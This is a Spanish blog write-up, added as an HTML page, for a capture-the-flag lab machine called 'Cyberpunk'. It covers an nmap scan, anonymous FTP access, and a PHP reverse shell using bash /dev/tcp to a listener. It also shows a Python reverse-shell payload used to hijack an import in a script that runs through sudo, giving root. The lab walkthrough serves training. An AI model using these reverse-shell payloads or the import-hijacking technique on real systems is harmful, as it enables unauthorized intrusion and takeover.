@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Jekyll">
+  
+
+  <title>thehackerslabs.com: máquina Cyberpunk - Hackers ficticios que hacen historia</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+  <link rel="alternate" type="application/rss+xml" title="Hackers ficticios que hacen historia" href="http://localhost:4000/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="thehackerslabs.com: máquina Cyberpunk" />
+<meta name="author" content="Danielprz21" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="danielprz writeups y cosas…" />
+<meta property="og:description" content="danielprz writeups y cosas…" />
+<link rel="canonical" href="http://localhost:4000/blog/2024/thehackerslabs-com-maquina-cyberpunk" />
+<meta property="og:url" content="http://localhost:4000/blog/2024/thehackerslabs-com-maquina-cyberpunk" />
+<meta property="og:site_name" content="Hackers ficticios que hacen historia" />
+<meta property="og:image" content="http://localhost:4000/blog/assets/thehackerslabs.com_cyberpunk/portada.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-06T20:10:00+02:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/blog/assets/thehackerslabs.com_cyberpunk/portada.png" />
+<meta property="twitter:title" content="thehackerslabs.com: máquina Cyberpunk" />
+<meta name="twitter:site" content="@danielprz" />
+<meta name="twitter:creator" content="@Danielprz21" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Danielprz21"},"dateModified":"2024-05-06T20:10:00+02:00","datePublished":"2024-05-06T20:10:00+02:00","description":"danielprz writeups y cosas…","headline":"thehackerslabs.com: máquina Cyberpunk","image":"http://localhost:4000/blog/assets/thehackerslabs.com_cyberpunk/portada.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2024/thehackerslabs-com-maquina-cyberpunk"},"url":"http://localhost:4000/blog/2024/thehackerslabs-com-maquina-cyberpunk"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+  <body>
+    <div id="wrapper">
+      <header>
+  <div>
+    <a href="/">
+    
+    <h1><!--email_off-->danielprz21@home:~$<!--/email_off--></h1>
+    </a>
+    <div class="header-links">
+      <a href="/about"><h2 class="header-link">Yo</h2></a>
+<a href="/"><h2 class="header-link">Blog</h2></a>
+<a href="/tags/"><h2 class="header-link">Etiquetas</h2></a>
+
+<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->
+
+    </div>
+  </div>
+</header>
+
+      <div class="container">
+        <section id="main_content">
+          <article>
+  <h2>thehackerslabs.com: máquina Cyberpunk</h2>
+  <div class="postitem">
+    
+      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge">blog</code></a>
+    
+    
+      <code class="posttag"><a href="/tags/#reverse-shell" class="no-decoration">Reverse Shell</a></code>
+    
+      <code class="posttag"><a href="/tags/#python-privilege-escalation" class="no-decoration">Python Privilege Escalation</a></code>
+    
+      <code class="posttag"><a href="/tags/#ftp-enumeration" class="no-decoration">FTP Enumeration</a></code>
+    
+      <code class="posttag"><a href="/tags/#anonymous-ftp-login" class="no-decoration">Anonymous FTP Login</a></code>
+    
+      <code class="posttag"><a href="/tags/#nmap-scan" class="no-decoration">Nmap Scan</a></code>
+    
+      <code class="posttag"><a href="/tags/#netcat-listener" class="no-decoration">Netcat Listener</a></code>
+    
+      <code class="posttag"><a href="/tags/#directory-traversal" class="no-decoration">Directory Traversal</a></code>
+    
+      <code class="posttag"><a href="/tags/#privilege-escalation" class="no-decoration">Privilege Escalation</a></code>
+    
+  </div>
+  <time datetime="2024-05-06T20:10:00+02:00" class="by-line">06 May 2024</time>
+  <p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/portada.png" alt="" />
+<br /></p>
+
+<h3 id="descripción">Descripción</h3>
+<hr />
+<p><br />
+Aquí veremos cómo logramos vulnerar la máquina “Cyberpunk” de The Hackers Labs. Esta máquina nos pone a prueba con una combinación interesante de vulnerabilidades y nos exige usar varias técnicas para llegar al acceso root. Se verán conceptos de programación, y codificaciones un tanto peculiar para obtener accesos máximos a esta máquina</p>
+
+<h3 id="enlace-de-lab">Enlace de Lab:</h3>
+<p><a href="https://thehackerslabs.com/cyberpunk/">thehackerslabs: Cyberpunk</a>.</p>
+
+<h3 id="dificultad">Dificultad:</h3>
+<p>Fácil.</p>
+
+<h3 id="solución">Solución</h3>
+<hr />
+<p><br /></p>
+
+<p>Para iniciar el proceso de <code class="language-plaintext highlighter-rouge">vulnerar</code> esta máquina, lo primero que haremos es con ayuda de <code class="language-plaintext highlighter-rouge">nmap</code> ver a qué nos estamos enfrentando.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span>  <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> 192.168.1.127  <span class="nt">-oX</span> report.xml <span class="nt">-v</span>
+</code></pre></div></div>
+<p>donde:</p>
+
+<p><code class="language-plaintext highlighter-rouge">-p-</code>: Escanea todos los puertos existentes (0-65365)</p>
+
+<p><code class="language-plaintext highlighter-rouge">-Pn</code>: Evita que <code class="language-plaintext highlighter-rouge">nmap</code> realice un descubrimiento de host antes de realizar el escaneo</p>
+
+<p><code class="language-plaintext highlighter-rouge">-sS</code>: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK</p>
+
+<p><code class="language-plaintext highlighter-rouge">--min-rate</code>: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que <code class="language-plaintext highlighter-rouge">nmap</code> enviará paquetes a una tasa muy alta</p>
+
+<p><code class="language-plaintext highlighter-rouge">--open</code>: Esta opción le indica a <code class="language-plaintext highlighter-rouge">nmap</code> que sólo muestre los puertos que están abiertos.</p>
+
+<p><code class="language-plaintext highlighter-rouge">-oX</code>: Guarda la salida del escaneo en un archivo XML llamado <code class="language-plaintext highlighter-rouge">report.xml</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">-v</code>: Aumenta la verbosidad de la salida de <code class="language-plaintext highlighter-rouge">nmap</code>, proporcionando más detalles sobre lo que está haciendo <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_1.JPG" alt="" />
+<br /></p>
+
+<p>Obtenemos 2 puertos abiertos,  <code class="language-plaintext highlighter-rouge">22 -&gt; ssh</code> y <code class="language-plaintext highlighter-rouge">80 -&gt; http</code>  .</p>
+
+<p>Ahora es momento de ver con qué versiones nos estamos enfrentando de cada servicio. Para ello implementamos el código:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p222</span>,80 192.168.1.127 <span class="nt">-oN</span> ports_version
+</code></pre></div></div>
+
+<p>Donde:</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">-sC</code></strong>Esta opción le dice a <code class="language-plaintext highlighter-rouge">nmap</code> que ejecute scripts predeterminados contra los puertos encontrados.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">-sV</code></strong>: Le indica a <code class="language-plaintext highlighter-rouge">nmap</code> que intente determinar la versión de los servicios que se están ejecutando en los puertos abiertos.</p>
+
+<blockquote>
+  <p><em>sCV es la combinación de ambos comandos</em>.</p>
+</blockquote>
+
+<p><img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_2.JPG" alt="" /></p>
+
+<p>Nos fijamos que tiene varios puertos vulnerables.</p>
+
+<p><code class="language-plaintext highlighter-rouge">puerto 21</code>: servicio FTP</p>
+
+<p><code class="language-plaintext highlighter-rouge">puerto 22</code>: servicio SSH</p>
+
+<p><code class="language-plaintext highlighter-rouge">puerto 80</code>: servicio http</p>
+
+<p>Lo primero que haremos es ver los vectores de entrada que tiene el <code class="language-plaintext highlighter-rouge">puerto 21</code>, vemos que podemos hacer login de forma anónima, para ello ejecutamos:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.1.127
+</code></pre></div></div>
+
+<p>Cuando nos pida <code class="language-plaintext highlighter-rouge">usuario</code> escribimos <code class="language-plaintext highlighter-rouge">anonymous</code> y el campo <code class="language-plaintext highlighter-rouge">password</code> lo dejamos en blanco</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_3.JPG" alt="" />
+<br /></p>
+
+<p>Una vez dentro, nos encontramos con varios archivos, el más interesante, es <code class="language-plaintext highlighter-rouge">secret.txt</code>. Lo descargamos con <code class="language-plaintext highlighter-rouge">get</code> y vemos que tiene el siguiente contenido:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*********************************************
+*                                           *
+*        Hola Netrunner,                   *
+*                                           *
+*   Has sido contratado por el mejor fixer  *
+*   de la ciudad para llevar a cabo una     *
+*   misión crucial.                         *
+*                                           *
+*   Tenemos información de que Arasaka,     *
+*   la mega-corporación más poderosa de     *
+*   Night City, está migrando sus sistemas  *
+*   y actualmente parece ser vulnerable.    *
+*   Necesitamos que te infiltres en sus    *
+*   sistemas y desactives el Relic para     *
+*   salvar la vida de V.                    *
+*                                           *
+*   Te espero en Apache.                    *
+*                                           *
+*                         - Alt             *
+*********************************************
+
+
+</code></pre></div></div>
+
+<p>A diferencia, de lo que especificaba el nombre, no nos da ninguna información tan relevante, a parte de decirnos que están migrando y que hay una vulnerabilidad.</p>
+
+<p>Fijándonos en el directorio <code class="language-plaintext highlighter-rouge">ftp</code>, nos fijamos que podemos subir archivos, así que lo que haremos es crear una <code class="language-plaintext highlighter-rouge">reverse shell</code> en <code class="language-plaintext highlighter-rouge">php</code> para acceder mediante el navegador.</p>
+
+<p>Para crear la <code class="language-plaintext highlighter-rouge">reverse shell</code>, lo hacemos con el siguiente código:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.119/443 0&gt;&amp;1'"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>lo subimos con el comando <code class="language-plaintext highlighter-rouge">put</code></p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_4.JPG" alt="" />
+<br /></p>
+
+<p>Abrimos una nueva terminal para usarlo como puerto de escucha, en el cual ejecutaremos la siguiente instrucción:</p>
+
+<div class="language-ssh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">nc</span> -lnvp <span class="m">443</span>
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_5.JPG" alt="" />
+<br /></p>
+
+<p>Ahora, mediante la web accedemos al archivo <code class="language-plaintext highlighter-rouge">php</code> que habíamos subido mediante el servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_6.JPG" alt="" />
+<br /></p>
+
+<p>Vamos a la terminal que teníamos de escucha y nos debería permitir poder ejecutar codigos en el servidor</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_7.JPG" alt="" />
+<br /></p>
+
+<p>Navegamos entre las carpetas más comunes del sistema que pudiesen tener información relevante, y encontramos algo en <code class="language-plaintext highlighter-rouge">/opt</code> con el nombre de <code class="language-plaintext highlighter-rouge">arasaka.txt</code>. El cual cuenta con el siguiente contenido:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>++++++++++[&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++&gt;+++++&gt;++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;-.&gt;+.&gt;--.&gt;+.&gt;++++.&gt;++.&gt;---.&gt;.&gt;---.&gt;.&gt;--.&gt;-----..
+</code></pre></div></div>
+
+<p>Esto lo pasamos a un traductor de <code class="language-plaintext highlighter-rouge">brainfuck to ascii</code> y nos debería dar una palabra, la cual aparenta ser la <code class="language-plaintext highlighter-rouge">clave</code>.</p>
+
+<p>Intentamos con el usuario arasaka y la clave que <code class="language-plaintext highlighter-rouge">decodificamos</code> del <code class="language-plaintext highlighter-rouge">brainfuck</code> y vemos que efectivamente, tenemos acceso.</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_9.JPG" alt="" />
+<br /></p>
+
+<p>Y si hacemos un <code class="language-plaintext highlighter-rouge">ls</code> nos percatamos de que ya tenemos acceso a la <code class="language-plaintext highlighter-rouge">flag</code> de usuario.</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/flag.JPG" alt="" />
+<br /></p>
+
+<p>Es momento de buscar una forma de <code class="language-plaintext highlighter-rouge">escalar privilegios</code> y poder llegar a <code class="language-plaintext highlighter-rouge">root</code>. Para ello, ejecutamos la siguiente instrucción</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_10.JPG" alt="" />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">randombase64.py</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="n">message</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter your string</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">message_bytes</span> <span class="o">=</span> <span class="n">message</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">base64_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">message_bytes</span><span class="p">)</span>
+<span class="n">base64_message</span> <span class="o">=</span> <span class="n">base64_bytes</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">ascii</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="nf">print</span><span class="p">(</span><span class="n">base64_message</span><span class="p">)</span>
+
+
+
+
+</code></pre></div></div>
+<p>Vemos que podemos ejecutar como usuario <code class="language-plaintext highlighter-rouge">root</code> un <code class="language-plaintext highlighter-rouge">script Python</code>, el cual ingresas un texto y lo traduce a <code class="language-plaintext highlighter-rouge">base64</code></p>
+
+<p>Viendo su <code class="language-plaintext highlighter-rouge">código fuente</code> podemos determinar que es posible hacer una <code class="language-plaintext highlighter-rouge">reverse shell</code> en <code class="language-plaintext highlighter-rouge">Python</code> y pasarla, esto porque el script <code class="language-plaintext highlighter-rouge">randombase64.py</code> en su primera línea hace un <code class="language-plaintext highlighter-rouge">import base64</code></p>
+
+<p>Creamos un script python llamado <code class="language-plaintext highlighter-rouge">base64.py</code> con la siguiente instrucción:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.119</span><span class="sh">"</span><span class="p">,</span><span class="mi">443</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>Abrimos una terminal con <code class="language-plaintext highlighter-rouge">nc</code> en escucha por el <code class="language-plaintext highlighter-rouge">puerto 443</code></p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_11.JPG" alt="" />
+<br /></p>
+
+<p>Del lado del servidor ejecutamos la instrucción</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/python3.11 /home/arasaka/randombase64.py
+</code></pre></div></div>
+
+<p>Y en nuestra terminal de escucha, tendremos el acceso <code class="language-plaintext highlighter-rouge">root</code> así como acceso a la <code class="language-plaintext highlighter-rouge">flag</code> para terminar el reto.</p>
+
+<p><br />
+<img src="/blog/assets/thehackerslabs.com_cyberpunk/paso_12.JPG" alt="" />
+<br /></p>
+
+<p>Y así es como obtenemos <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+
+</article>
+
+        </section>
+      </div>
+    </div>
+
+     
+  
+    <footer class="site-footer">
+  <div class="row">
+    <div class="footer-wrapper">
+      <div class="footer-col-social col-5 col-s-4">
+        <ul>
+  
+    <li class="social-media-list">
+      <a title="Email Address" href="mailto:rubel.daniel.perez@gmail.com"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12.713l-11.985-9.713h23.971l-11.986 9.713zm-5.425-1.822l-6.575-5.329v12.501l6.575-7.172zm10.85 0l6.575 7.172v-12.501l-6.575 5.329zm-1.557 1.261l-3.868 3.135-3.868-3.135-8.11 8.848h23.956l-8.11-8.848z"/></svg>
+</span><span>rubel.daniel.perez@gmail.com</span></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="GitHub Profile" href="https://github.com/rubelperez"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+</span><span>rubelperez</span></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="X Profile" href="https://x.com/danielprz217"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
+</span><span>danielprz217</span></a>
+    </li>
+  
+
+  
+
+  
+    <li class="social-media-list">
+      <a title="LinkedIn Profile" href="https://linkedin.com/in/rubeldanielperez"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+</span><span>rubeldanielperez</span></a>
+    </li>
+  
+
+
+  <!---->
+
+  
+
+  <li class="social-media-list">
+    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
+</span><span>rss</span></a>
+  </li>
+</ul>
+
+      </div>
+      <div class="footer-col-badges col-3 col-s-5">
+        <ul>
+  
+    <li class="social-media-list">
+      <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/730318"><img src="https://www.hackthebox.eu/badge/image/730318" alt="Hack The Box"></a>
+    </li>
+  
+
+  
+    <li class="social-media-list">
+      <a title="TryHackMe Profile" href="https://tryhackme.com/p/danielprz217"><img src="https://tryhackme-badges.s3.amazonaws.com/danielprz217.png" alt="TryHackMe"></a>
+    </li>
+  
+</ul>
+
+
+      </div>
+      <div class="footer-col-copyright col-10 col-s-10">
+        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+          <span>
+              <b>danielprz21</b>
+          </span>
+          
+          <span>© 2024</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    
+  </body>
+</html>
